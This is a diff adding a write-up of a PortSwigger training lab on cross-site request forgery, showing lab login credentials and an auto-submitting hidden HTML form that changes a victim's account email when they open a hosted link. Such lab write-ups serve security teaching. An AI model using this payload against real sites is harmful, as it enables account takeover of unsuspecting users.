@@ -61,3 +61,41 @@ To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's
 
 You can log in to your own account using the following credentials: wiener:peter 
 ```
+
+After logging in, we can change our own email address:
+
+<p align="center">
+  <img src="/img/img1.png"><br/>
+</p>
+
+First things first, we examine the request sent to update our email:
+
+<p align="center">
+  <img src="/img/img2.png"><br/>
+</p>
+
+Cleaning it up a little:
+
+<p align="center">
+  <img src="/img/img3.png"><br/>
+</p>
+
+For a CSRF, we can create a form with 1 input, `email`, that's sent to our lab url. Since there's no CSRF tokens, if we host this url in a website & send the url to a victim, this will successfully change their email.
+
+Our form:
+
+```html
+<form id="f" method="POST" action="https://0ab00099034d0c18826d339700bc00bd.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="attacker@qa.team">
+</form>
+```
+
+With a little JS, we can automatically submit the form:
+
+```html
+<script>
+    window.f.submit();
+</script>
+```
+
+We store our payload in exploit server (Or we can deploy our own), deliver the link to the victim.
